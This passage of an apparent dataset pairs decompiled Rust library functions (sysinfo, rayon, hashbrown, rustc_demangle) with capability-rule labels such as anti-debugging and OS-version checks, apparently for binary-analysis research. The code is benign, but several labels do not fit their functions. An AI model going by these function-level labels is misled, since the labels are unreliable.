        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Connection__::had4d00c9aeaf5a33\n               (ulong *arg1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    \n    // core::ptr::drop_in_place<core::option::Option<sysinfo::windows::component::Connection>>::had4d00c9aeaf5a33\n    if (*arg1 == 2) {\n        return;\n    }\n    uStack48 = *(arg1 + 4);\n    uStack44 = *(arg1 + 0x24);\n    uStack40 = *(arg1 + 5);\n    uStack36 = *(arg1 + 0x2c);\n    arg1[4] = 0;\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Enumerator__::hcf9e9d88b61ba464\n              (&uStack48);\n    uStack48 = *(arg1 + 2);\n    uStack44 = *(arg1 + 0x14);\n    uStack40 = *(arg1 + 3);\n    uStack36 = *(arg1 + 0x1c);\n    arg1[2] = 0;\n    sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n              (&uStack48);\n    uStack48 = *arg1;\n    uStack44 = *(arg1 + 4);\n    uStack40 = *(arg1 + 1);\n    uStack36 = *(arg1 + 0xc);\n    *arg1 = 0;\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af\n              (&uStack48);\n    sub.ole32.dll_CoUninitialize();\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af(arg1);\n    sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n              (arg1 + 2);\n    if ((arg1[4] != 0) && (arg1[5] != NULL)) {\n    // WARNING: Could not recover jumptable at 0x0043e85d. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*arg1[5] + 0x10))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 613
    },
    "b5bc10e6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.sysinfo::traits::SystemExt::refresh_components::hb5bc10e6d4e85c88(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t *arg1_00;\n    ulong uStack248;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    int64_t iStack208;\n    ulong uStack200;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    ulong uStack152;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    \n    // sysinfo::traits::SystemExt::refresh_components::hb5bc10e6d4e85c88\n    arg1_00 = *(arg1 + 0xf0) + 0x18;\n    iVar2 = *(arg1 + 0x100) * 0x58;\n    do {\n        if (iVar2 == 0) {\n            return;\n        }\n        iVar1 = *arg1_00;\n        if (iVar1 == 2) {\n            sym.sysinfo::windows::component::Connection::new::h9d9247846222b171(&uStack200);\n            if (uStack200 == 2) {\ncode_r0x004400b3:\n                uStack152 = 2;\n            }\n            else {\n                uStack216 = uStack168;\n                uStack212 = uStack164;\n                iStack208 = CONCAT44(uStack156, uStack160);\n                uStack232 = uStack184;\n                uStack228 = uStack180;\n                uStack224 = uStack176;\n                uStack220 = uStack172;\n                uStack248 = uStack200;\n                uStack240 = uStack192;\n                uStack236 = uStack188;\n                sym.sysinfo::windows::component::Connection::initialize_security::h9d5df667c471c1f0\n                          (&uStack152, &uStack248);\n                if (uStack152 == 2) goto code_r0x004400b3;\n                uStack216 = uStack120;\n                uStack212 = uStack116;\n                iStack208 = CONCAT44(uStack108, uStack112);\n                uStack232 = uStack136;\n                uStack228 = uStack132;\n                uStack224 = uStack128;\n                uStack220 = uStack124;\n                uStack248 = uStack152;\n                uStack240 = uStack144;\n                uStack236 = uStack140;\n                sym.sysinfo::windows::component::Connection::create_instance::h5d640f778ed79abf(&iStack104, &uStack248);\n                if (iStack104 == 2) goto code_r0x004400b3;\n                uStack216 = uStack72;\n                uStack212 = uStack68;\n                iStack208 = CONCAT44(uStack60, uStack64);\n                uStack232 = uStack88;\n                uStack228 = uStack84;\n                uStack224 = uStack80;\n                uStack220 = uStack76;\n                uStack248 = CONCAT44(uStack100, iStack104);\n                uStack240 = uStack96;\n                uStack236 = uStack92;\n                sym.sysinfo::windows::component::Connection::connect_server::h5280256771dd6976(&uStack200, &uStack248);\n                if (uStack200 == 2) goto code_r0x004400b3;\n                uStack216 = uStack168;\n                uStack212 = uStack164;\n                iStack208 = CONCAT44(uStack156, uStack160);\n                uStack232 = uStack184;\n                uStack228 = uStack180;\n                uStack224 = uStack176;\n                uStack220 = uStack172;\n                uStack248 = uStack200;\n                uStack240 = uStack192;\n                uStack236 = uStack188;\n                sym.sysinfo::windows::component::Connection::set_proxy_blanket::h73216c3484e1ebbd\n                          (&uStack152, &uStack248);\n            }\n            sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Connection__::had4d00c9aeaf5a33\n                      (arg1_00);\n            *(arg1_00 + 4) = uStack120;\n            *(arg1_00 + 0x24) = uStack116;\n            *(arg1_00 + 5) = uStack112;\n            *(arg1_00 + 0x2c) = uStack108;\n            *(arg1_00 + 2) = uStack136;\n            *(arg1_00 + 0x14) = uStack132;\n            *(arg1_00 + 3) = uStack128;\n            *(arg1_00 + 0x1c) = uStack124;\n            *arg1_00 = uStack152;\n            *(arg1_00 + 4) = uStack152._4_4_;\n            *(arg1_00 + 1) = uStack144;\n            *(arg1_00 + 0xc) = uStack140;\n            iVar1 = *arg1_00;\n            *arg1_00 = 2;\n            if (iVar1 != 2) goto code_r0x0044010c;\n            uStack200 = 2;\n        }\n        else {\n            *arg1_00 = 2;\ncode_r0x0044010c:\n            iStack208 = arg1_00[5];\n            uStack240 = *(arg1_00 + 1);\n            uStack236 = *(arg1_00 + 0xc);\n            uStack232 = *(arg1_00 + 2);\n            uStack228 = *(arg1_00 + 0x14);\n            uStack224 = *(arg1_00 + 3);\n            uStack220 = *(arg1_00 + 0x1c);\n            uStack216 = *(arg1_00 + 4);\n            uStack212 = *(arg1_00 + 0x24);\n            uStack248 = iVar1;\n            sym.sysinfo::windows::component::Connection::exec_query::h9da30763d39de1c5(&uStack200, &uStack248);\n        }\n        sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Connection__::had4d00c9aeaf5a33\n                  (arg1_00);\n        *(arg1_00 + 4) = uStack168;\n        *(arg1_00 + 0x24) = uStack164;\n        *(arg1_00 + 5) = uStack160;\n        *(arg1_00 + 0x2c) = uStack156;\n        *(arg1_00 + 2) = uStack184;\n        *(arg1_00 + 0x14) = uStack180;\n        *(arg1_00 + 3) = uStack176;\n        *(arg1_00 + 0x1c) = uStack172;\n        *arg1_00 = uStack200;\n        *(arg1_00 + 4) = uStack200._4_4_;\n        *(arg1_00 + 1) = uStack192;\n        *(arg1_00 + 0xc) = uStack188;\n        if (*arg1_00 != 2) {\n            sym.sysinfo::windows::component::Connection::temperature::h2e042d15b548ab9a(&uStack248, arg1_00, 0);\n            if (uStack248._4_4_ != 2) {\n                *(arg1_00 + 6) = uStack248;\n                if (*(arg1_00 + 0x34) <= uStack248 && uStack248 != *(arg1_00 + 0x34)) {\n                    *(arg1_00 + 0x34) = uStack248;\n                }\n            }\n        }\n        arg1_00 = arg1_00 + 0xb;\n        iVar2 = iVar2 + -0x58;\n    } while( true );\n}\n",
        "token_count": 1981
    },
    "373d85f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid sym.rayon_core::registry::WorkerThread::wait_until::h373d85f342d65a84(int64_t arg1, uint64_t *arg2)\n\n{\n    int64_t **arg1_00;\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    char cVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t **ppiVar8;\n    int64_t iVar9;\n    int64_t *in_R8;\n    unkbyte7 in_R9;\n    uint32_t uVar10;\n    uint64_t *puVar12;\n    int64_t *unaff_R13;\n    uint64_t *puVar13;\n    bool bVar14;\n    uint8_t uStack261;\n    uint32_t uStack260;\n    uint64_t *puStack256;\n    int64_t iStack248;\n    uint64_t uStack240;\n    uint64_t *puStack232;\n    uint64_t *puStack224;\n    ulong uStack216;\n    uint64_t *puStack208;\n    uint64_t *puStack200;\n    int64_t iStack192;\n    ulong uStack184;\n    int64_t iStack176;\n    int64_t *piStack168;\n    uint32_t uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint64_t uStack136;\n    int64_t iStack128;\n    ulong *puStack120;\n    int64_t *piStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    uint64_t *puStack72;\n    uint64_t *puVar11;\n    \n    // rayon_core::registry::WorkerThread::wait_until::h373d85f342d65a84\n    if (*arg2 == 3) {\n        return;\n    }\n    uStack184 = *(arg1 + 0x120);\n    LOCK();\n    piVar2 = *(arg1 + 0x130) + 0x1d0;\n    *piVar2 = *piVar2 + 0x10000;\n    iStack128 = arg1 + 0x100;\n    puVar12 = arg2;\n    puStack256 = arg2;\n    iStack248 = arg1;\ncode_r0x0040fc5d:\n    uStack260 = 0;\n    uStack136 = 0xffffffffffffffff;\ncode_r0x0040fc74:\n    if (*puVar12 == 3) {\n        sym.rayon_core::sleep::Sleep::work_found::h7414ea3b54864ef5(*(arg1 + 0x130) + 0x1a8);\n        return;\n    }\n    piVar2 = sym.crossbeam_deque::deque::Worker_T_::pop::heffa62d1c96fb557(iStack128);\n    puVar13 = arg2;\n    if (arg2 == NULL) {\n        iVar9 = *(arg1 + 0x130);\n        uStack80 = *(iVar9 + 400);\n        puVar11 = *(iVar9 + 0x1a0);\n        puStack120 = &uStack80;\n        iStack176 = arg1;\n        puStack72 = puVar11;\n        if (0x1 < puVar11) {\ncode_r0x0040fcdf:\n            uStack261 = 0;\n            uVar6 = *(iStack176 + 0x128) >> 0xc ^ *(iStack176 + 0x128);\n            uVar6 = uVar6 << 0x19 ^ uVar6;\n            uVar6 = uVar6 >> 0x1b ^ uVar6;\n            *(iStack176 + 0x128) = uVar6;\n            puStack232 = (uVar6 * 0x2545f4914f6cdd1d) % puVar11;\n            uStack240 = 1;\n            uStack216 = 1;\n            puStack208 = NULL;\n            uStack104 = &puStack120;\n            uStack96 = &iStack176;\n            uStack88 = &uStack261;\n            puStack224 = puVar11;\n            puStack200 = puStack232;\n            iStack192 = iStack176;\n            piStack112 = &iStack192;\n            do {\n                puVar13 = puStack232;\n                if (puStack224 <= puStack232) {\n                    uStack152 = uStack96;\n                    uStack148 = uStack96._4_4_;\n                    uStack144 = uStack88;\n                    uStack140 = uStack88._4_4_;\n                    piStack168 = piStack112;\n                    uStack160 = uStack104;\n                    uStack156 = uStack104._4_4_;\n                    goto code_r0x0040fdd0;\n                }\n                arg2 = puStack232;\n                puStack232 = puStack232 + 1;\n                piVar2 = sym.core::iter::adapters::filter::filter_try_fold::__u7b__u7b_closure_u7d__u7d_::hed7bdfc9786469d5\n                                   (&piStack112, puVar13);\n                puVar13 = arg2;\n            } while (arg2 == NULL);\n            goto code_r0x0040fdfd;\n        }\n        goto code_r0x0040fe29;\n    }\n    goto code_r0x0041015b;\n    while( true ) {\n        puStack208 = puStack208 + 1;\n        piVar2 = sym.core::iter::adapters::filter::filter_try_fold::__u7b__u7b_closure_u7d__u7d_::hed7bdfc9786469d5\n                           (&piStack168, puVar13);\n        puVar13 = arg2;\n        if (arg2 != NULL) break;\ncode_r0x0040fdd0:\n        puVar13 = puStack208;\n        arg2 = puStack208;\n        if (puStack200 <= puStack208) {\n            piVar2 = unaff_R13;\n            puVar13 = NULL;\n            break;\n        }\n    }\ncode_r0x0040fdfd:\n    unaff_R13 = piVar2;\n    if ((puVar13 != NULL) || ((uStack261 & 1) == 0)) goto code_r0x0040fe14;\n    goto code_r0x0040fcdf;\ncode_r0x0040fe14:\n    if (puVar13 == NULL) {\n        iVar9 = *(arg1 + 0x130);\ncode_r0x0040fe29:\n        do {\n            piStack168 = piStack168 & 0xffffffff00000000;\n            while( true ) {\n                arg1 = iStack248;\n                puVar12 = puStack256;\n                uVar6 = *(iVar9 + 0x80);\n                arg1_00 = *(iVar9 + 0x88);\n                uVar10 = uVar6 >> 1 & 0x3f;\n                puVar11 = uVar10;\n                if (puVar11 != 0x3f) break;\n                sym._ZN15crossbeam_utils7backoff7Backoff6snooze17he19e96ba0c9f83d6E.197(&piStack168);\n            }\n            uVar7 = uVar6 + 2;\n            if ((uVar6 & 1) == 0) {\n                arg2 = *(iVar9 + 0x100) >> 1;\n                if (uVar6 >> 1 == arg2) goto code_r0x0040fe9d;\n                uVar7 = uVar7 | 0x7f < (*(iVar9 + 0x100) ^ uVar6);\n            }\n            LOCK();\n            puVar12 = iVar9 + 0x80;\n            uVar1 = *puVar12;\n            *puVar12 = *puVar12 ^ (uVar6 == uVar1) * (*puVar12 ^ uVar7);\n            if (uVar6 == uVar1) {\n                if (uVar10 == 0x3e) {\n                    uStack240 = uStack240 & 0xffffffff00000000;\n                    while (piVar2 = *arg1_00,  piVar2 == NULL) {\n                        sym._ZN15crossbeam_utils7backoff7Backoff6snooze17he19e96ba0c9f83d6E.197(&uStack240);\n                    }\n                    iVar3 = *piVar2;\n                    *(iVar9 + 0x88) = piVar2;\n                    *(iVar9 + 0x80) = iVar3 != 0 | uVar7 + 2 & 0xfffffffffffffffe;\n                }\n                uStack240 = uStack240 & 0xffffffff00000000;\n                ppiVar8 = arg1_00 + puVar11 * 3 + 3;\n                while ((*ppiVar8 & 1) == 0) {\n                    sym._ZN15crossbeam_utils7backoff7Backoff6snooze17he19e96ba0c9f83d6E.197(&uStack240);\n                }\n                piVar2 = arg1_00[puVar11 * 3 + 1];\n                puVar13 = arg1_00[puVar11 * 3 + 2];\n                arg2 = 0x3e;\n                if (puVar11 == 0x3e) {\ncode_r0x00410144:\n                    sym.crossbeam_deque::deque::Block_T_::destroy::h4f1d6e1cf366fa83(arg1_00, arg2, in_R8);\n                    arg1 = iStack248;\n                    puVar12 = puStack256;\n                }\n                else {\n                    piVar4 = *ppiVar8;\n                    do {\n                        LOCK();\n                        bVar14 = piVar4 == *ppiVar8;\n                        *ppiVar8 = *ppiVar8 ^ bVar14 * (*ppiVar8 ^ (piVar4 | 2));\n                        piVar4 = piVar4 ^ !bVar14 * (piVar4 ^ *ppiVar8);\n                    } while (!bVar14);\n                    arg2 = puVar11;\n                    arg1 = iStack248;\n                    puVar12 = puStack256;\n                    if ((piVar4 & 4) != 0) goto code_r0x00410144;\n                }\n                break;\n            }\n        } while( true );\n    }\ncode_r0x0041015b:\n    sym.rayon_core::sleep::Sleep::work_found::h7414ea3b54864ef5(*(arg1 + 0x130) + 0x1a8);\n    (*puVar13)(piVar2);\n    uStack184 = *(arg1 + 0x120);\n    LOCK();\n    piVar4 = *(arg1 + 0x130) + 0x1d0;\n    *piVar4 = *piVar4 + 0x10000;\n    unaff_R13 = piVar2;\n    goto code_r0x0040fc5d;\ncode_r0x0040fe9d:\n    if (uStack260 < 0x20) {\n        sub.KERNEL32.dll_SwitchToThread();\n        uStack260 = uStack260 + 1;\n        arg1 = iStack248;\n        puVar12 = puStack256;\n    }\n    else {\n        iVar9 = *(iStack248 + 0x130);\n        if (uStack260 == 0x20) {\n            do {\n                uVar7 = *(iVar9 + 0x1d0);\n                uVar6 = uVar7;\n                if ((uVar7 & 0x100000000) == 0) break;\n                uVar6 = uVar7 + 0x100000000;\n                LOCK();\n                puVar13 = iVar9 + 0x1d0;\n                uVar1 = *puVar13;\n                *puVar13 = *puVar13 ^ (uVar7 == uVar1) * (*puVar13 ^ uVar6);\n            } while (uVar7 != uVar1);\n            sub.KERNEL32.dll_SwitchToThread();\n            uStack260 = 0x21;\n            uStack136 = uVar6 >> 0x20;\n        }\n        else {\n            LOCK();\n            uVar6 = *puStack256;\n            *puStack256 = *puStack256 ^ (uVar6 == 0) * (*puStack256 ^ 1);\n            if (uVar6 == 0) {\n                in_R8 = 0x448ab8;\n                iVar3 = sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h03d0b9f747e8ea10\n                                  (iVar9 + 0x1b8, uStack184, 0x448ab8);\n                sym.std::sync::mutex::Mutex_T_::lock::h62098323f0fb8253(&uStack240, iVar3);\n                arg2 = 0x448ad0;\n                piVar2 = sym.core::result::Result_T_E_::unwrap::h275888c52c276ebd(&uStack240, 0x448ad0);\n                uStack160 = uStack160 & 0xffffff00 | arg2;\n                uStack260 = 0;\n                LOCK();\n                uVar6 = *puVar12;\n                *puVar12 = *puVar12 ^ (uVar6 == 1) * (*puVar12 ^ 2);\n                piStack168 = piVar2;\n                if (uVar6 == 1) {\n                    do {\n                        uVar6 = *(iVar9 + 0x1d0);\n                        if (uVar6 >> 0x20 != uStack136) {\n                            uStack260 = 0x20;\n                            if (*puVar12 != 3) {\n                                LOCK();\n                                *puVar12 = *puVar12 ^ (*puVar12 == 2) * *puVar12;\n                            }\n                            goto code_r0x00410010;\n                        }\n                        LOCK();\n                        puVar13 = iVar9 + 0x1d0;\n                        uVar7 = *puVar13;\n                        *puVar13 = *puVar13 ^ (uVar6 == uVar7) * (*puVar13 ^ uVar6 + 1);\n                    } while (uVar6 != uVar7);\n                    if ((*(*(arg1 + 0x130) + 0x100) ^ *(*(arg1 + 0x130) + 0x80)) < 2) {\n                        *(piVar2 + 9) = 1;\n                        cVar5 = '\\x01';\n                        while (cVar5 != '\\0') {\n                            sym.std::sync::condvar::Condvar::wait::h04043a752ec3db26\n                                      (&uStack240, iVar3 + 0x10, piVar2, CONCAT71(in_R9, arg2 != 0));\n                            uVar6 = 0x448ae8;\n                            in_R8 = piVar2;\n                            piVar2 = sym.core::result::Result_T_E_::unwrap::h275888c52c276ebd(&uStack240, 0x448ae8);\n                            arg2 = uVar6 & 0xffffffffffffff01;\n                            cVar5 = *(piVar2 + 9);\n                        }\n                        uStack160 = uStack160 & 0xffffff00 | arg2;\n                        piStack168 = piVar2;\n                    }\n                    else {\n                        LOCK();\n                        *(iVar9 + 0x1d0) = *(iVar9 + 0x1d0) + -1;\n                    }\n                    if (*puVar12 != 3) {\n                        LOCK();\n                        *puVar12 = *puVar12 ^ (*puVar12 == 2) * *puVar12;\n                    }\n                    sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::h1d527a45e74a1c46(&piStack168);\n                    uStack260 = 0;\n                    uStack136 = 0xffffffffffffffff;\n                }\n                else {\ncode_r0x00410010:\n                    sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::h1d527a45e74a1c46(&piStack168);\n                    uStack136 = 0xffffffffffffffff;\n                }\n            }\n        }\n    }\n    goto code_r0x0040fc74;\n}\n",
        "token_count": 3671
    },
    "881a924a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool sym.core::ops::function::FnOnce::call_once::h881a924a36322bce(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint uStack296;\n    uint32_t uStack292;\n    uint32_t uStack288;\n    \n    // core::ops::function::FnOnce::call_once::h881a924a36322bce\n    sub.msvcrt.dll_memset(&uStack292, 0, 0x118);\n    uStack296 = 0x11c;\n    iVar2 = sub.ntdll.dll_RtlGetVersion(&uStack296);\n    if (iVar2 < 0) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = true;\n        if (uStack292 < 7) {\n            bVar1 = 2 < uStack288 && uStack292 == 6;\n        }\n    }\n    return bVar1;\n}\n",
        "token_count": 206
    },
    "908bae7f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint64_t sym._ZN4core4hash3sip9u8to64_le17h908bae7fbeb16cffE.364(int64_t arg1, int64_t arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    \n    if (arg3 < 4) {\n        uVar2 = 0;\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = *(arg1 + arg2);\n        uVar2 = 4;\n    }\n    if ((uVar2 | 1) < arg3) {\n        uVar1 = uVar1 | *(arg1 + uVar2 + arg2) << (uVar2 * '\\b' & 0x3fU);\n        uVar2 = uVar2 | 2;\n    }\n    if (uVar2 < arg3) {\n        uVar1 = uVar1 | *(arg1 + arg2 + uVar2) << (uVar2 << 3);\n    }\n    return uVar1;\n}\n",
        "token_count": 236
    },
    "62098323": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid sym.std::sync::mutex::Mutex_T_::lock::h62098323f0fb8253(uint64_t *arg1, uint64_t SRWLock)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    \n    // std::sync::mutex::Mutex<T>::lock::h62098323f0fb8253\n    uVar2 = SRWLock;\n    sub.KERNEL32.dll_AcquireSRWLockExclusive(SRWLock);\n    uVar1 = sym._ZN3std4sync6poison4Flag5guard17h7c1dc4a1daf9103dE.196(SRWLock + 8);\n    arg1[1] = SRWLock;\n    *(arg1 + 2) = uVar2 & 1;\n    *arg1 = uVar1 & 1;\n    return;\n}\n",
        "token_count": 190
    },
    "ff2a4216": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::process::compute_cpu_usage::hff2a421680c6be7f(int64_t hProcess, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    float fVar4;\n    uint64_t uStack88;\n    uint64_t uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    \n    // sysinfo::windows::process::compute_cpu_usage::hff2a421680c6be7f\n    uStack72 = 0;\n    uStack88 = 0;\n    uStack80 = 0;\n    uStack64 = 0;\n    uStack56 = 0;\n    uStack48 = 0;\n    sub.KERNEL32.dll_GetProcessTimes(*(hProcess + 0xb8), &uStack72, &uStack72, &uStack88, &uStack80);\n    sub.KERNEL32.dll_GetSystemTimes(&uStack64, &uStack56, &uStack48);\n    uVar1 = *(hProcess + 0xd0);\n    if (uStack56 < *(hProcess + 0xd0)) {\n        uVar1 = 0;\n    }\n    uVar2 = *(hProcess + 0xd8);\n    if (uStack48 < *(hProcess + 0xd8)) {\n        uVar2 = 0;\n    }\n    uVar1 = (uStack48 - uVar2) + (uStack56 - uVar1);\n    if (uVar1 == 0) {\n        fVar4 = 0.0;\n    }\n    else {\n        uVar2 = *(hProcess + 0xc0);\n        if (uStack88 < *(hProcess + 0xc0)) {\n            uVar2 = 0;\n        }\n        uVar3 = *(hProcess + 200);\n        if (uStack80 < *(hProcess + 200)) {\n            uVar3 = 0;\n        }\n        uVar2 = (uStack80 + uStack88) - (uVar3 + uVar2);\n        if (arg2 < 0) {\n            fVar4 = arg2 & 1 | arg2 >> 1;\n            fVar4 = fVar4 + fVar4;\n        }\n        else {\n            fVar4 = arg2;\n        }\n        fVar4 = (((SUB168(CONCAT412(*0x444574, CONCAT48(SUB124(ZEXT812(uVar2) >> 0x20, 0), uVar2)) >> 0x40, 0) -\n                  *0x444588) + ((uVar2 & 0xffffffff | *0x444570 << 0x20) - *0x444580)) /\n                ((SUB168(CONCAT412(*0x444574, CONCAT48(SUB124(ZEXT812(uVar1) >> 0x20, 0), uVar1)) >> 0x40, 0) -\n                 *0x444588) + ((uVar1 & 0xffffffff | *0x444570 << 0x20) - *0x444580))) * *0x444590 * fVar4;\n        *(hProcess + 200) = uStack80;\n        *(hProcess + 0xc0) = uStack88;\n        *(hProcess + 0xd8) = uStack48;\n        *(hProcess + 0xd0) = uStack56;\n    }\n    *(hProcess + 0x108) = fVar4;\n    return;\n}\n",
        "token_count": 798
    },
    "24d089cf": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid sym.hashbrown::raw::RawTableInner_A_::record_item_insert_at::h24d089cf3fcd1ed6\n               (uint64_t *arg1, int64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint8_t uVar3;\n    \n    // hashbrown::raw::RawTableInner<A>::record_item_insert_at::h24d089cf3fcd1ed6\n    arg1[2] = arg1[2] - (noname_2 & 1);\n    uVar1 = *arg1;\n    uVar2 = arg1[1];\n    uVar3 = arg4 >> 0x39;\n    *(uVar2 + arg2) = uVar3;\n    *((arg2 - 0x10U & uVar1) + 0x10 + uVar2) = uVar3;\n    arg1[3] = arg1[3] + 1;\n    return;\n}\n",
        "token_count": 229
    },
    "8598a27f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t sym._rustc_demangle::v0::Ident_as_core::fmt::Display_::fmt::h8598a27f66376be2(uint8_t **arg1, int64_t arg2)\n\n{\n    uint8_t *puVar1;\n    ulong uVar2;\n    code *pcVar3;\n    uchar auVar4 [16];\n    char cVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint8_t *puVar10;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    uint32_t uVar13;\n    int64_t iVar14;\n    uint32_t *puVar15;\n    uint8_t uVar16;\n    uint64_t uVar17;\n    uint64_t uVar18;\n    uint64_t uVar19;\n    uint64_t uVar20;\n    bool bVar21;\n    uint64_t uStack640;\n    uint64_t uStack632;\n    uint32_t uStack620;\n    int64_t iStack616;\n    uint8_t *puStack608;\n    uint8_t *puStack600;\n    uint8_t *puStack592;\n    uint8_t *puStack584;\n    uint32_t auStack576 [128];\n    \n    // <rustc_demangle::v0::Ident as core::fmt::Display>::fmt::h8598a27f66376be2\n    sub.msvcrt.dll_memset(auStack576);\n    puStack600 = arg1[3];\n    if (puStack600 != NULL) {\n        puStack608 = arg1[2];\n        uVar16 = *puStack608;\n        puStack592 = *arg1;\n        puStack584 = arg1[1];\n        if (puStack584 == NULL) {\n            uVar19 = 0;\n        }\n        else {\n            uVar19 = 0;\n            puVar10 = puStack592;\n            do {\n                uVar6 = *puVar10;\n                uVar11 = uVar6;\n                if (uVar6 < '\\0') {\n                    uVar13 = uVar6 & 0x1f;\n                    puVar1 = puVar10 + 1;\n                    if (uVar6 < 0xe0) {\n                        puVar10 = puVar10 + 2;\n                        uVar11 = uVar13 << 6 | *puVar1 & 0x3f;\n                    }\n                    else {\n                        uVar11 = puVar10[2] & 0x3f | (*puVar1 & 0x3f) << 6;\n                        if (uVar6 < 0xf0) {\n                            puVar10 = puVar10 + 3;\n                            uVar11 = uVar11 | uVar13 << 0xc;\n                        }\n                        else {\n                            uVar11 = puVar10[3] & 0x3f | uVar11 << 6 | (uVar6 & 7) << 0x12;\n                            if (uVar11 == 0x110000) break;\n                            puVar10 = puVar10 + 4;\n                        }\n                    }\n                }\n                else {\n                    puVar10 = puVar10 + 1;\n                }\n                if (uVar19 == 0x80) goto code_r0x00413bd9;\n                auStack576[uVar19] = uVar11;\n                uVar19 = uVar19 + 1;\n            } while (puVar10 != puStack584 + puStack592);\n        }\n        iStack616 = uVar19 * 4;\n        uStack632 = 700;\n        uVar18 = 0x48;\n        uStack640 = 0x80;\n        uVar9 = 0;\n        puVar10 = puStack608;\n        while( true ) {\n            iStack616 = iStack616 + 4;\n            puVar10 = puVar10 + 1;\n            bVar21 = false;\n            uVar20 = 0x24;\n            uVar12 = 0;\n            arg1 = 0x1;\n            while( true ) {\n                uVar17 = 0;\n                if (uVar18 <= uVar20) {\n                    uVar17 = uVar20 - uVar18;\n                }\n                if (uVar17 == 0) {\n                    uVar17 = 1;\n                }\n                if (0x19 < uVar17) {\n                    uVar17 = 0x1a;\n                }\n                uVar6 = uVar16;\n                if (bVar21) {\n                    if (puVar10 == puStack608 + puStack600) goto code_r0x00413bd9;\n                    uVar6 = *puVar10;\n                    puVar10 = puVar10 + 1;\n                }\n                uVar7 = uVar6 + 0x9f;\n                if (0x19 < uVar7) {\n                    if (9 < uVar6 - 0x30) goto code_r0x00413bd9;\n                    uVar7 = uVar6 - 0x16;\n                }\n                auVar4 = 